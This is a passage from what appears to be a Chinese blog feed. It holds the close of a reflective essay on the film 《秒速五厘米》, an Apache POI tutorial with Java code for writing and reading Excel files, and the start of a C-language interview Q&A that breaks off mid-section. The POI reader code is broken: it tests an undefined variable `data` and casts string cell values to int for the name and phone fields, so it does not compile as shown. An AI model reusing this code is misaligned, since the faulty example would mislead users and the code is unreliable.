src="https://cos.gjcloak.xyz/upload/2023/02/4199826198.png"></p><p>在宇航员里面，贵树常常坐着一个梦，他和一个轮廓模糊的女孩坐在遥远星球的草原上，眺望远在天边映衬在璀璨光辉里的地球。长大着的明里的面孔对他来说，已渐渐变得模糊而未知。鹿儿岛拥有着无比清澈高远的天空，无比柔和的大块云团，以及无比湛蓝的海水。只是它离繁华的东京，和恋人所在的地方是那么地遥远，遥远到就连在梦里，都再也无法触及。</p><p>暗恋着贵树的澄田花苗是心酸的，甚至为了让自己心里有勇气向贵树表白，把成功冲上浪花作为向贵树表白的资格。从初二开始暗恋贵树直到他远赴东京上大学，为了和他上同一所高中拼命学习，5个365天把这份纯洁的情感深藏心底，究竟需要多大的勇气，耐心和毅力，又是需要怎样的一份认真的喜欢才能坚持的下来的。</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3445491061.png"></p><p>为了和心仪的人一起共同骑过回家时那条短短的路，每天都带着一份揣测不安的心守在车库的后面，如此细腻的女生心思，在每天都得经历的煎熬里，却不曾犹豫和后悔地坚持了5年。澄田是带着一份无时无刻都深陷于暗恋的痛苦中，但每次见到贵树就又感到无比幸福的无能为力心情，度过那漫漫煎熬的五年的。</p><p>影片里最让我心酸的一个片段：在便利店外阴暗的街灯下，每次看到贵树给什么人发短信时，澄田总是在心里默想，如果那个人是她，该是会有多么的幸福…</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/1556885864.png"></p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/1731723062.png"></p><p>当花苗的卡布跃出院子热情地舔着归来的主人时，贵树脸上给了一个特写，那是一张黯然神伤，心思如冰的脸，对贵树来说，花苗回家时至少还有她的卡布来迎接，而他和远在天边的明里已是多少年没见过面了，只有不断麻木，无谓而重复地写着永远没有收件人的短信，向一片没有回声的空白诉说着已经快要彻底把他淹没了的万念俱灰。</p><p>那时的澄田，其实就像是她在山坡上贵树旁掷出的那架纸飞机，被大风吹向缀满银河星光的夜空，只是一心地为了喜欢的人孤独地在漆黑里向前，却从不曾知道自己什么时候能够到达终点，什么时候又终究会被抛回地面，直至摔得遍体鳞伤…</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3530311532.png"></p><p>而贵树所要经历的，则是一次更为漆黑漫长永无止境的孤独之旅，“那真正是一段让人无法想象的孤独旅程，在真正的黑暗中，一味前行着，连一个氢原子也碰不到，只是深信着世界的秘密存在于深渊之中，怀着想要接近这秘密的决心。”</p><p>电影里有一段原声音乐，夹杂在清新的鹿儿岛一个阳光明媚的充满海风的气息的早晨里，风格类似玛丽和马克思的主题曲，都采用了ambient music的曲风。而澄田在这样的一天也终于乘上了浪花之巅。也许在她生命里再没有一天能比这一天这么重要了，在毕业前，她终于努力让自己在的内心里找到了一个配得上贵树的理由了，并决定对深藏了五年来的感情宣誓表白了。</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3679384280.png"></p><p>“拼命地，只是一味地向天空伸出双手，发射如此巨大的物体，注视于存在于无尽远方的某些东西”与其说，这句话是澄田在说她泪流满面那一刻腾空而起的宇宙飞船，不如说，她终于明白了自己的处境。贵树的内心对她而言，就像是那遥远的无尽远方，无论她是怎样努力地奔跑，也是永远无法到达的。在夜色里，澄田望着渐渐远去的贵树的背影，那是一盏始终在孤单中前行的失落的身影，一张总是对她如此温柔却永远无法被读懂的轮廓。她心里的那盏黯淡的灯火，终于熄灭，曾在黑暗里奋力带她孤独向前的那双翅膀，也终于折断了所有的羽翼，掉落在黑夜的另一边。在泪水落下的那一刻，澄田终于可以不再继续她的无尽的黑暗之旅，而贵树，仍然孤单地穿梭在永无止境的道路上…</p><h3 id="三、《秒速五厘米》"><a href="#三、《秒速五厘米》" class="headerlink" title="三、《秒速五厘米》"></a>三、《秒速五厘米》</h3><p><img src="https://cos.gjcloak.xyz/upload/2023/02/2434061965.png"></p><p>多年后的东京，樱花依然如此绚烂地凋落，洁白的花瓣，散乱一地，落进敞开的窗户里。每一朵花瓣都像一颗凋零的心，而每个故事，早已千疮百孔。<br>“只是一心地前进，想要触碰到那些无法触及的东西，但却不知道那具体指什么。等我回过神来才发现，日渐疲惫的心，是如此痛苦。”</p><p>《红豆》里唱——</p><p>还没好好的感受<br>雪花绽放的气候<br>我们一起颤抖<br>会更明白什么是温柔<br>还没跟你牵着手<br>走过荒芜的沙丘<br>可能从此以后<br>学会珍惜天长和地久<br>有时候有时候<br>我会相信一切有尽头-<br>相聚离开都有时候<br>没有什么会永垂不朽<br>可是我有时候<br>宁愿选择留恋不放手<br>等到风景都看透<br>也许你会陪我看细水<br>长流——</p><p>贵树还没来得及把相思的红豆，熬成缠绵的伤口，与明里一起分享，始终没有……而明里的身影却早已消失在芸芸的众生里。</p><p>当贵树走进书店，随手拿起一本书，看到当初发射的卫星已到达太阳系外，而属于他的那段旅程，究竟又到达了哪里。15年了，十五年前的铁道两旁，明里说，真希望明年这时还能一起看樱花。十五年后，铁道两旁，一切都那么地相似，仿佛昨天一般，一样的铁轨，一样漫天的樱花，却终于隔开了世上最远的距离。从我的心到达你的心，秒速五厘米的分离，日日夜夜，终究也已绕地球一圈。当列车终于消失在眼前，你的身影，早已离去。就这样，相信总有一天还能一起看樱花的愿望，也最终风干在记忆里，像挂在悲伤孩子脸上的泪痕，成为永恒…</p><p>永恒和梦的相似之处，就在于他们都是永远也无法实现的…</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/2195310196.png"></p><p>当初看完第一遍时，其实我也在想，究竟是什么阻隔了贵树和明里之间的联系，如果他们仍然像过去一样用书信和电话保持着联系，纵使贵树再也没法通过列车前往探望明里，纵使他还没能攒够一个人飞往东京的机票，纵使他的手机里无法理解地没有明里的号码。他们依然还有希望的。</p><p>在影片的后期采访里，新海诚对这个话题给出他的一个模糊不清的回答，原话大概是，对于在时间和空间这种无能为力的客观因素下，在这样一个时代，这样的情况可能已经渐渐变得平常。</p><p>之后个人在重看时，特别注意了片尾的MV片段的细节，由于放的太快，外加观影时还要注意字幕。所以不可避免地在这一段观众会错失很多重要的细节。重看几遍后，才渐渐看出一些倪端。这里仔细作个回放：</p><p>离开书店的贵树再次经过曾经住过的旧宅，视野停留在少年时曾无数次打开的信箱上。<br>坐在贵树曾经独自前来探望她的那条东京和岩舟之间的路上，长大后的明里发呆地盯着窗外，眼神带着淡淡的迷茫。<br>辞职后的贵树独自穿梭在繁华的东京的夜景里，漫天飘落的雪花和当初前往探望明里那个夜晚如此熟悉。<br>十四岁那年，独自看着漫天凋落的樱花的明里。追在贵树后面的澄田。<br>在那次相聚分离后，一封明里开了个头，却终于再也无话可说的信件。<br>两人的生活终于渐渐地没有了交集，而此刻，如果当初贵树没有遗失在风里的那封信件在明里手上，事情也许又会有多大的不同吧。<br>这是明里寄给贵树的最后一封信，之后渐渐地两人的信箱都只剩下一片空白。</p><p>这时的贵树旁多了花苗，只是贵树始终没有进入角色，仍然在他那条孤独前行的路上…</p><p>明里的旁边也多了另外一个人，但是故事的细节，我们无从而知，也已经无力纠缠。</p><p>这是澄田在机场送别贵树的最后场面。</p><p>贵树抬头的瞬间，眼前又浮现起在雪地里奔跑着的明里，那时他们都还小，而那张被冻得微微发红的脸，却再也没有给他答案。</p><p>十四岁那年，一个人坐在教室角落发呆的明里，一个人坐在教室角落发呆的贵树，没寄出去的信件，没打出去的电话。<br>MV的最后，画面再次切回到两人未寄出的两封信件。在列车晚点的几个小时里，明里在候车室火炉旁写下的那封，和贵树倾注了两个星期，最终丢失在刺骨的寒风里的那封，拉开了这场秒速五厘米的漫长旅程的序幕，也就此在不经意间注定了两人的结局。</p><p>“然后某一天清晨，我发觉自己以前那么认真诚恳的感情，已经消失得无影无踪。”贵树坚持了十五年的感情，十五年来醒着睡着站着坐着梦里梦外都放在心上的竭尽全力想要去维护的那份感情终于还是无疾而终。仍记得在返程东京的路上，将手掌贴在车窗上的贵树，那么坚决地渴望总有一天能够拥有保护明里的力量。在十五年夜以继日的煎熬中，在终于可以兑现诺言的一天到来之时，那个他想保护的人却已经随风而去，消失在岁月的风尘里。</p><p>贵树的等待是悲情的，而澄田则是追随着悲情的悲情。爱情本就没有对错，在错误的地方错误的时间遇上正确的人，本就是一场悲剧。花苗是可怜的，她把一个女孩子最青春的年华都赌在了一场从一开始就没有结局的暗恋上，在她成年之后，她一去不返的青春年华留给她的所有记忆只是无数个充满苦涩的夜晚。五年来她所有的心情，都是关于一个男生的，一个她永远也无法走进，总是注视着无比遥远的远方的男生。而这段每天都使她更加痛苦的暗恋心情也注定将会在她记忆深处陪她度过一生…</p><p>请不要说遗憾是一种美丽，请理解挣扎出一段岁月是多么的困难，又需要多大的勇气。有些东西是永远无法忘记的，即使抹平了棱角，剩下的依然是底色。人们常常无可救药地保留着悲伤，因为那一刻空旷无比的内心，早已一无所有，只剩下所有忧伤堆积成的回忆，而这些回忆已经成了生命继续下去仅有的所有理由。</p><p>如果喜欢一个人，那是因为我们真的无能为力…</p><p>米兰昆德拉在《生命不能承受之轻》中说过，“追求的终极永远是朦胧的，要逃避痛苦，最常见的就是躲进未来。在时间的轨道上，人们总想象有一条线，超脱了这条线，当前的痛苦也许就会永不复存在。”明里对于贵树，贵树对于田澄，都是彼此生命里永远无法承受之轻，而存在的那条线，我想，也许就是新海诚在影片的最后想给观众表达的所有…<br>如果这一天你的身旁有幸有这样一个人，请给自己写一份拥有美好结局的剧本。如果有一天，全世界都充满了秒速五厘米，那么，我想，这个世界离它的末日也一定不远了。</p><p>对于《秒速五厘米》，想说的最后一句话——</p><p>愿天下有情人， 终成眷属…</p><p>（PS：本文原发布于B站，链接是<a href="https://www.bilibili.com/read/cv22654">这个</a>。现因搭建了博客后，开始逐渐搬迁原来的文章过来）</p>]]></content>
      
      
      <categories>
          
          <category> 专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新海诚 </tag>
            
            <tag> 秒速五厘米 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Poi-微软Office读写库</title>
      <link href="/49.html"/>
      <url>/49.html</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Apache POI是Apache软件基金会的开放源码函式库，POI提供API给Java程序对Microsoft Office格式档案读和写的功能。</p><p>结构：</p><ul><li>HSSF － 提供读写Microsoft Excel格式档案的功能。</li><li>XSSF － 提供读写Microsoft Excel OOXML格式档案的功能。</li><li>HWPF － 提供读写Microsoft Word格式档案的功能。</li><li>HSLF － 提供读写Microsoft PowerPoint格式档案的功能。</li><li>HDGF － 提供读写Microsoft Visio格式档案的功能。</li></ul><h2 id="HSSF读写Excel"><a href="#HSSF读写Excel" class="headerlink" title="HSSF读写Excel"></a>HSSF读写Excel</h2><p>理解Excel中的几个名词：</p><ul><li>Workbook 工作簿</li><li>Sheet 页</li><li>Row 行</li><li>Cell 单元格</li></ul><p>一个工作簿包含多页，每页有多行，每行可以有多个单元格。</p><h3 id="写入Excel"><a href="#写入Excel" class="headerlink" title="写入Excel"></a>写入Excel</h3><p>将一个List数据写入Excel，表头为VO的每个成员名，表体为List中的所有数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public class ExcelWriterUtil &#123;</span><br><span class="line">    </span><br><span class="line">    public static void writeExcel(String filePath, List&lt;ExampleVO&gt; voList) &#123;</span><br><span class="line">        HSSFWorkbook workbook = new HSSFWorkbook(); // 创建HSSF工作簿</span><br><span class="line">        HSSFSheet sheet = workbook.createSheet(); // 创建页</span><br><span class="line">        HSSFRow headerRow = sheet.createRow(0); // 创建表头</span><br><span class="line">        HSSFCell cell; // 单元格</span><br><span class="line"></span><br><span class="line">        String[] headerContent = ExampleVO.getHeaderData(); //获取表头内容</span><br><span class="line">        // 表头内容填充</span><br><span class="line">        for (int i = 0; i &lt; headerContent.length; i++) &#123;</span><br><span class="line">            cell = headerRow.createCell(i);</span><br><span class="line">            cell.setCellValue(headerContent[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 数据填充</span><br><span class="line">        int rowNum = 1; //当前行数</span><br><span class="line">        for (ExampleVO vo : voList) &#123;</span><br><span class="line">            HSSFRow dataRow = sheet.createRow(rowNum++);</span><br><span class="line">            dataRow.createCell(0).setCellValue(vo.getId());</span><br><span class="line">            dataRow.createCell(1).setCellValue(vo.getName());</span><br><span class="line">            dataRow.createCell(2).setCellValue(vo.getPhone());</span><br><span class="line">            // ... 根据VO成员数或自行决定创建多少单元格</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 输出工作簿文件</span><br><span class="line">        try &#123;</span><br><span class="line">            FileOutputStream file = new FileOutputStream(filePath);</span><br><span class="line">            workbook.write(file);</span><br><span class="line">            file.close();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读出Excel"><a href="#读出Excel" class="headerlink" title="读出Excel"></a>读出Excel</h3><p>将Excel中的数据读出，根据表头映射到对应VO中，放入List集合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">public class ExcelReaderUtil &#123;</span><br><span class="line"></span><br><span class="line">    private static final String XLS = &quot;xls&quot;;</span><br><span class="line"></span><br><span class="line">    private static Workbook getWorkbook(InputStream inputStream, String fileType) throws IOException &#123;</span><br><span class="line">        Workbook workbook = null;</span><br><span class="line">        if (fileType.equalsIgnoreCase(XLS)) &#123;</span><br><span class="line">            workbook = new HSSFWorkbook(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">        return workbook;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static List&lt;ExampleVO&gt; readExcel(String filePath) &#123;</span><br><span class="line">        Workbook workbook = null;</span><br><span class="line">        FileInputStream excelFile = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            String fileType = filePath.substring(filePath.lastIndexOf(&quot;.&quot;) + 1, filePath.length());</span><br><span class="line">            excelFile = new FileInputStream(filePath);</span><br><span class="line">            workbook = getWorkbook(excelFile, fileType);</span><br><span class="line">            // 获取Excel数据</span><br><span class="line">            List&lt;ExampleVO&gt; voList = parseExcel(workbook);</span><br><span class="line">            return voList;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return null;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (null != workbook) workbook.close();</span><br><span class="line">                if (null != excelFile) excelFile.close();</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static List&lt;ExampleVO&gt; parseExcel(Workbook workbook) &#123;</span><br><span class="line">        List&lt;ExampleVO&gt; voList = new ArrayList&lt;&gt;();</span><br><span class="line">        for (int sheetNum = 0; sheetNum &lt; workbook.getNumberOfSheets(); sheetNum++) &#123;</span><br><span class="line">            Sheet sheet = workbook.getSheetAt(sheetNum);</span><br><span class="line"></span><br><span class="line">            if (null == sheet) continue;</span><br><span class="line"></span><br><span class="line">            int headerRowNum = sheet.getFirstRowNum();</span><br><span class="line">            Row headerRow = sheet.getRow(headerRowNum);</span><br><span class="line">            if (null == headerRow) &#123;</span><br><span class="line">                Log.e(&quot;parseExcel&quot;, &quot;表头数据未找到&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int rowStart = headerRowNum + 1;</span><br><span class="line">            int rowEnd = sheet.getPhysicalNumberOfRows();</span><br><span class="line">            for (int rowNum = rowStart; rowNum &lt; rowEnd; rowNum++) &#123;</span><br><span class="line">                Row row = sheet.getRow(rowNum);</span><br><span class="line">                if (null == row) continue;</span><br><span class="line"></span><br><span class="line">                ExampleVO vo = convertRowToData(row);</span><br><span class="line"></span><br><span class="line">                if (null == data) &#123;</span><br><span class="line">                    Log.e(&quot;converRowToData&quot;, rowNum + &quot;行数据不合法，已忽略&quot;);</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                voList.add(vo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return voList;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static ExampleVO convertRowToData(Row row) &#123;</span><br><span class="line">        ExampleVO vo = new ExampleVO();</span><br><span class="line">        Cell cell;</span><br><span class="line">        int cellNum = 0;</span><br><span class="line">        cell = row.getCell(cellNum++);</span><br><span class="line">        vo.setId((int) cell.getNumericCellValue());</span><br><span class="line"></span><br><span class="line">        cell = row.getCell(cellNum++);</span><br><span class="line">        vo.setName((int) cell.getStringCellValue());</span><br><span class="line"></span><br><span class="line">        cell = row.getCell(cellNum++);</span><br><span class="line">        vo.setPhone((int) cell.getStringCellValue());</span><br><span class="line"></span><br><span class="line">        return vo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://poi.apache.org/">Apache POI</a></p><p><a href="https://www.cnblogs.com/gdwkong/p/8669220.html">POI概述与操作Excel</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Office读写库 </tag>
            
            <tag> 微软 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言面试题</title>
      <link href="/48.html"/>
      <url>/48.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是程序"><a href="#什么是程序" class="headerlink" title="什么是程序"></a>什么是程序</h3><ul><li><p>程序：一组计算机能识别和执行的指令，每一条指令使计算机执行特定的操作，只要让计算机执行这个程序，计算机就会自动地、有条不紊地进行工作。<br>计算机的一切操作都是由程序控制的，离开程序，计算机将一事无成。</p></li><li><p>一个程序包括以下两方面的信息：</p><ul><li>（1）<strong>对数据的描述</strong>。在程序中要指定到哪些数据以及这些数据的类型和结构的组织形式，这就是<strong>数据结构</strong>。</li><li>（2）<strong>对操作的描述</strong>。即要求计算机进行操作的步骤，也就是<strong>算法</strong>。</li></ul></li></ul><h3 id="软件可分为哪两部分"><a href="#软件可分为哪两部分" class="headerlink" title="软件可分为哪两部分"></a>软件可分为哪两部分</h3><ul><li>系统软件：操作系统、高级语言。</li><li>应用软件：用户根据自己的实际需要设计一些应用程序，例如学生成绩统计程序、财务管理程序、工程中的计算程序等。</li></ul><h3 id="介绍一下-C-语言"><a href="#介绍一下-C-语言" class="headerlink" title="介绍一下 C 语言"></a>介绍一下 C 语言</h3><ul><li>C 语言是一种用途广泛、功能强大、使用灵活的过程性编程语言，既可用于编写应用软件，又能用于编写系统软件。因此 C 语言问世以后得到迅速推广。</li></ul><h3 id="什么是计算机语言"><a href="#什么是计算机语言" class="headerlink" title="什么是计算机语言"></a>什么是计算机语言</h3><p>如果想人和计算机交流信息，必须有一种计算机和人都能识别的语言，这就是计算机语言。</p><h3 id="简述一下计算机语言的发展"><a href="#简述一下计算机语言的发展" class="headerlink" title="简述一下计算机语言的发展"></a>简述一下计算机语言的发展</h3><ul><li><p>第一阶段：计算机低级语言</p><ul><li>机器语言（由 0 和 1 组成的指令），一般计算机的指令长度为 16，即以 16 个二进制数（0 或 1）组成一条指令，难以推广使用。</li><li>汇编语言（用英文字母和数字表示指令），例如用 ADD 代表“加”，SUB 代表“减”，不能直接执行，汇编程序翻译成机器语言。</li><li>缺点：可移植性差，由于它“贴近”计算机，或者说离计算机“很近”，称为计算机低级语言（low level language）。</li></ul></li><li><p>第二阶段：计算机高级语言（接近于人的自然语言和数学语言）</p><p>计算机也是不能直接识别高级程序语言程序的，也要进行“翻译”。用一种称为编译程序或解释程序的软件把高级语言写的程序（称为源程序，source program）转换为机器指令的程序（称为目标文件，object program），链接目标文件，生成可执行的文件。比如：C、C++、Visual Basic、Java 等</p><ul><li><p>面向过程的语言</p><ul><li>（1）非结构化的语言：初期的语言属于非结构化的语言，编程风格比较随意，只要符合语法规则即可，没有严格的规范要求，程序中的流程可以随意跳转。人们往往追求程序执行的效率而采用了许多“小技巧”，使程序变得难以阅读和维护。早期的 Basic，Fortrant 和 Algol 等都属于非结构化的语言。</li><li>（2）结构化语言：为了解决以上问题，提出了“结构化程序设计方法”，规定程序必须由具有良好的基本结构（顺序结构、分支结构、循环结构）构成，程序中的流程不允许随意跳转，程序总是由上而下顺序执行各个基本结构。这种程序结构清晰，易于编写、阅读和维护。Qbasic、Fortran 77 和 C 语言等属于结构化语言，这些语言的特点是支持结构化程序设计方法。</li></ul></li><li><p>面向对象的语言</p><ul><li>近十多年来，在处理规模较大的问题时，开始使用面向对象的语言。C++、C#、Visual Basic 和 Java 等语言是支持面向对象程序设计方法的语言</li></ul></li></ul></li></ul><h3 id="C-语言主要特点"><a href="#C-语言主要特点" class="headerlink" title="C 语言主要特点"></a>C 语言主要特点</h3><ul><li>（1）语言简洁、紧凑，使用方便、灵活，只有 37 个关键字、9 种控制语句，程序书写形式自由，源程序短</li><li>（2）运算符丰富</li><li>（3）数据类型丰富<br>包括：整型、浮点型、字符型、数组类型、指针类型、结构体类型、共用体类型；<br>C99又扩充了复数浮点类型、超长整型（long long）、布尔类型（bool）<br>指针类型数据，能用来实现各种复杂的数据结构（如链表、树、栈等）的运算。</li><li>（4）具有结构化的控制语句<br>如if…else语句、while语句、do…while语句、switch语句、for语句<br>用函数作为程序的模块单位，便于实现程序的模块化。<br>C语言是完全模块化和结构化的语言。</li><li>（5）语法限制不太严格，程序设计自由度大</li><li>（6）C语言允许直接访问物理地址，能进行位（bit）操作，能实现汇编语言的大部分功能，可以直接对硬件进行操作。因此C语言既具有高级语言的功能，又具有低级语言的许多功能，可用来编写系统软件。C语言的这种双重性，使它既是成功的系统语言描述，又是通用的程序设计语言。</li><li>（7）用C语言编写的程序可移植性好。由于C的编译系统相当简洁，因此很容易移植到新的系统。而且C编译系统在新的系统上运行时，可以直接编译“标准链接库”中的大部分功能，不需要修改源代码，因为标准链接库是用可移植的C语言写的。因此，几乎在所有的计算机系统中都可以使用C语言。</li><li>（8）生成目标代码质量高，程序执行效率高</li></ul><h3 id="运行C程序的步骤与方法"><a href="#运行C程序的步骤与方法" class="headerlink" title="运行C程序的步骤与方法"></a>运行C程序的步骤与方法</h3><p>（1）上机输入和编辑源程序（.c 文件）<br>（2）对源程序进行编译（.obj 文件）<br>（3）进行链接处理（.exe 文件）<br>（4）运行可执行程序，得到运行结果</p><h3 id="程序设计的任务"><a href="#程序设计的任务" class="headerlink" title="程序设计的任务"></a>程序设计的任务</h3><p>1、问题分析<br>（1）对于接手的任务要进行认真的分析<br>（2）研究所给定的条件<br>（3）分析最后应达到的目标<br>（4）找出解决问题的规律<br>（5）选择解题的方法<br>2、设计算法<br>设计出解题的方法和具体步骤<br>3、编写程序<br>4、对源程序进行编辑、编译和连接<br>5、运行程序，分析结果<br>6、编写程序文档</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h3><p><strong>广义地说，为解决一个问题而采取的方法和步骤，就称为“算法”。</strong><br>对同一个问题，可以有不同的解题方法和步骤。<br>为了有效地进行解题，不仅需要保证算法正确，还要考虑算法的质量，选择合适的算法。</p><h3 id="算法的特性"><a href="#算法的特性" class="headerlink" title="算法的特性"></a>算法的特性</h3><p>一个有效的算法应该具有以下特点：</p><p>（1）有穷性<br>一个算法应包含有限的操作步骤，而不能是无限的。<br>（2）确定性<br>算法中的每一个步骤都应当是确定的，而不应当是含糊的、模棱两可的。<br>（3）有零个或多个输入<br>所谓输入是指在执行算法时需要从外界取得必要的信息。<br>（4）有一个或多个输出<br>算法的目的是为了求解，“解”就是输出。没有输出的算法是没有意义的。<br>（5）有效性<br>算法中的每一个步骤都应当能有效地执行，并得到确定的结果。</p><h3 id="结构化程序设计方法"><a href="#结构化程序设计方法" class="headerlink" title="结构化程序设计方法"></a>结构化程序设计方法</h3><p>结构化程序设计强调程序设计风格和程序结构的规范化，提倡清晰的结构。<br>结构化程序设计方法的基本思路是：把一个复杂问题的求解过程分阶段进行，每个阶段处理的问题都控制在人们容易理解和处理的范围内。<br>采取以下方法保证得到结构化的程序：<br>（1）自顶向下<br>（2）逐步细化<br>（3）模块化设计<br>（4）结构化编码</p><h3 id="算法有哪些描述方法？各有什么优缺点"><a href="#算法有哪些描述方法？各有什么优缺点" class="headerlink" title="算法有哪些描述方法？各有什么优缺点"></a>算法有哪些描述方法？各有什么优缺点</h3><p>（1）自然语言（2）伪代码（3）流程图（4）计算机语言</p><p>优缺点：<br>自然语言通俗易懂，但有歧义性；<br>伪代码方便实用，但没有流程图明晰，容易犯逻辑错误；<br>流程图明晰但绘制和修改时比较繁琐；<br>计算机语言表示算法严谨，但无法做到算法设计的第一步就使用计算机语言，读程序比看流程图要费神很多。</p><h3 id="C-语言有哪两种选择语句"><a href="#C-语言有哪两种选择语句" class="headerlink" title="C 语言有哪两种选择语句"></a>C 语言有哪两种选择语句</h3><ul><li>（1）if 语句，实现两个分支的选择结构</li><li>（2）switch 语句，实现多分支的选择结构</li></ul><h3 id="结构化的算法有哪几种结构"><a href="#结构化的算法有哪几种结构" class="headerlink" title="结构化的算法有哪几种结构"></a>结构化的算法有哪几种结构</h3><ul><li>顺序结构：由顺序执行的一组语句或结构组成。</li><li>分支结构：根据判断条件，做出取舍，要么执行A分支要么执行B分支，必须执行其中的一个，不可全执行也不可全不执行。</li><li>循环结构：由需要反复执行的一段代码或者结构组成。<br>任何算法功能都可以通过以上三种基本程序结构的组合来实现。</li></ul><h2 id="数据与数据类型"><a href="#数据与数据类型" class="headerlink" title="数据与数据类型"></a>数据与数据类型</h2><h3 id="C-语言数据类型有哪几类？基本数据类型包括哪几类"><a href="#C-语言数据类型有哪几类？基本数据类型包括哪几类" class="headerlink" title="C 语言数据类型有哪几类？基本数据类型包括哪几类"></a>C 语言数据类型有哪几类？基本数据类型包括哪几类</h3><ul><li>语言提供了丰富的数据类型，可以根据这些数据类型构造出不同的结构。</li><li>C中的数据类型包括：基本类型、构造类型、指针类型、空类型等。</li><li>其中基本类型包括：整型、字符型、实型（浮点型）等。</li></ul><h3 id="简述一下常量和变量"><a href="#简述一下常量和变量" class="headerlink" title="简述一下常量和变量"></a>简述一下常量和变量</h3><ul><li><p><strong>常量</strong>：在程序运行过程中，其值不能被改变的量</p><ul><li>整型常量：如1000,12345，0，-345<br>实型常量：如十进制小数形式：0.34 